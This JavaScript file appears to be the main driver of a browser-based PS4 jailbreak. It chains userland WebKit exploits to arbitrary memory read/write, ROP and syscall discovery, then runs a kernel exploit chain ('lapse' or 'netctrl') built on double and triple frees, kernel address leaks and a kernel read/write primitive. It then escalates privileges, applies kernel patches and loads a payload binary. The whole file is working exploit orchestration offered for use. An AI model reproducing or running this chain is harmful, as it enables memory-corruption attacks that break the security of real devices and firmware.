function load_script(src, remote = true, transfer = []) {
  return new Promise((resolve, reject) => {
    const script = document.createElement("script");
    script.src = src;
    script.onload = resolve;
    script.onerror = reject;
    document.head.appendChild(script);
  });
}

async function doJb() {
  await load_script("src/misc.js");

  try {
    version.init();

    const FW = version.major * 100 + (version.minor || 0);

    // Check if selected kernel exploit supports this FW
    if (exploitChain === "lapse" && FW >= 1250) {
      logger.error(`Lapse exploit is patched from FW 12.50+.`);
      logger.error("Switching to NetControl exploit...");
      exploitChain = "netctrl";
      localStorage.setItem("exploitChain", "netctrl");
      document.getElementById("netctrl-exploit").checked = true;
    }

    switch (version.console) {
      case 4:
        await load_script("src/ps4/constants.js");
        await load_script("src/ps4/userland.js");
        if (FW >= 1150) {
          await load_script("src/ps4/vueafterfree.js");
        }
        break;
      case 5:
        //TODO
        break;
      default:
        logger.info(`Unsupported console ${version.console}`);
    }

    // Validate required offsets exist
    if (typeof constants.KPATCH === "undefined" && typeof constants.SYSENT_661 === "undefined") {
      logger.error(`No kernel offsets found for FW ${version.major}.${version.minor || 0}.`);
      logger.error("This firmware version is not yet supported.");
      return;
    }

    logger.info("===USERLAND===");

    if (FW >= 1150) {
      // VueAfterFree path: init_vaf_rw sets up arw.master, arw.victim, arw.leak_addr
      await init_vaf_rw();

      // init_arw(undefined) patches victim length (redundant after VAF fixup, but keeps consistency)
      init_arw(undefined);

      // init_rop discovers webkit_base, libc_base, libkernel_base and sets up ROP chain
      init_rop();

      // init_syscalls scans for syscalls using libkernel_base
      init_syscalls();
    } else {
      // CSSFontFace path
      let rw = undefined;
      if (arw.master === undefined) {
        rw = await init_rw();
      }

      init_arw(rw);
      init_rop();
      init_syscalls();
    }

    logger.info("===END===");

    await load_script("src/loader.js");
    await load_script("src/workers.js");

    switch (version.console) {
      case 4:
        await load_script("src/ps4/kernel.js");
        break;
      case 5:
        //TODO
        break;
      default:
        logger.info(`Unsupported console ${version.console}`);
    }

    await load_script(`src/${exploitChain}.js`);

    logger.info(`===${exploitChain.toUpperCase()}===`);

    try {
      if (exploitChain == "lapse") {
        init();
        await setup();
        await double_free_reqs2();
        leak_kaddrs();
        double_free_reqs1();
        make_karw();

        // Increase reference counts for the pipes
        inc_karw_pipe_refcnt();

        logger.info("Corrupted context cleanup started...");

        // Remove pktinfo pointers
        remove_pktinfo_from_so(pktopts_twins[0]);

        // Remove rthdr pointers
        remove_rthdr_from_so(pktopts_twins[1]);
        remove_rthdr_from_so(rthdr_twins[0]);

        logger.info("Corrupted context cleanup completed !!");
      } else {
        init();
        await setup();
        await ucred_triple_free();
        leak_kqueue();
        await make_karw();

        inc_karw_pipe_refcnt();

        logger.info("Corrupted context cleanup started...");

        // Remove rthdr pointers from triplets
        for (let i = 0; i < triplets.length; i++) {
          remove_rthdr_from_so(triplets[i]);
        }

        // Remove triple freed file from free list
        remove_uaf_file();

        logger.info("Corrupted context cleanup completed !!");
      }
    } finally {
      cleanup();
    }

    find_all_proc();

    // Avoid reapplying if already done
    if (fn.setuid.invoke(0) === -1) {
      jailbreak();

      if (constants.KPATCH) {
        try {
          const kpatches_rsp = await fetch(`src/ps4/patches/${constants.KPATCH}`);
          if (!kpatches_rsp.ok) throw new Error(`Failed to fetch kernel patches: ${kpatches_rsp.status}`);
          const kpatches_buf = await kpatches_rsp.arrayBuffer();
          const kpatches_u8 = new Uint8Array(kpatches_buf);
          kernel_patches(kpatches_u8);
        } catch (e) {
          logger.error(`Kernel patches load failed: ${e.message}`);
        }
      }

      try {
        const bin_rsp = await fetch("src/payload.bin");
        if (!bin_rsp.ok) throw new Error(`Failed to fetch payload: ${bin_rsp.status}`);
        const bin_buf = await bin_rsp.arrayBuffer();
        const bin_u8 = new Uint8Array(bin_buf);
        load_bin(bin_u8);
      } catch (e) {
        logger.error(`Payload load failed: ${e.message}`);
      }
    }

    logger.info("===END===");
  } catch (e) {
    logger.error(e.message);
    logger.error(e.stack);
    //mem.free_all();
  }
}
